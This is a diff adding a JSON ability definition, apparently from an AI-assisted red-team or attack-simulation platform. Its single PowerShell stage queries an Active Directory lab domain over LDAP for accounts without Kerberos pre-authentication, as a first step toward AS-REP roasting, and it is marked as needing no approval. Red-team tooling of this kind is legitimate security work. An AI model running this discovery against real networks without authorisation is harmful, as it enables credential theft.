@@ -1,0 +1,34 @@
+{
+  "ability_id": "bf8dafee-16c7-464b-9e33-f1519c13a662",
+  "skill": "accessing-credentials",
+  "saved_at": "2026-06-25T07:46:35.989990+00:00",
+  "ability": {
+    "name": "Native AS-REP Roast Discovery",
+    "description": "Queries north.sevenkingdoms.local via ADSI to find accounts that do not require Kerberos preauthentication to facilitate targeted AS-REP roasting.",
+    "mitre_tactic": "credential-access",
+    "mitre_technique_id": "T1558.004",
+    "platform": "windows",
+    "impact_type": "reconnaissance",
+    "default_severity": "low",
+    "requires_approval": false,
+    "tags": [
+      "as-rep",
+      "roasting"
+    ],
+    "created_by": "ai",
+    "engagement_id": "e70e34e075264e7c97c2156a69c0574b"
+  },
+  "stages": [
+    {
+      "stage_name": "native-asrep-roast-discovery",
+      "stage_order": 1,
+      "executor": "powershell",
+      "command_template": "$d='C:\\Windows\\Temp\\bas'; if(!(Test-Path \"$d\\cred_access\")){ni -ItemType Directory -Force \"$d\\cred_access\"|out-null}; $(try { $roastable = @(); try { $searcher = [ADSISearcher]\"(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))\"; $searcher.SearchRoot = [ADSI]\"LDAP://192.168.127.11/DC=north,DC=sevenkingdoms,DC=local\"; foreach($res in $searcher.FindAll()) { $roastable += $res.Properties.samaccountname }; if ($roastable.Count -gt 0) { Write-Output \"Found roastable accounts: $($roastable -join ', ')\" } else { Write-Output \"No accounts found with DONT_REQ_PREAUTH\" } } catch { Write-Output \"AS-REP LDAP search failed: $_\" } } catch { \"ERROR: $_\" }) | Tee-Object -FilePath \"$d\\cred_access\\asrep_out.txt\"",
+      "timeout_seconds": 90,
+      "payload_id": null
+    }
+  ],
+  "rationale": "Finds vulnerable accounts that do not enforce pre-authentication natively over ADSI to avoid noisy or unauthorized external tooling.",
+  "provider": "lead-red-teamer",
+  "cited_urls": []
+}
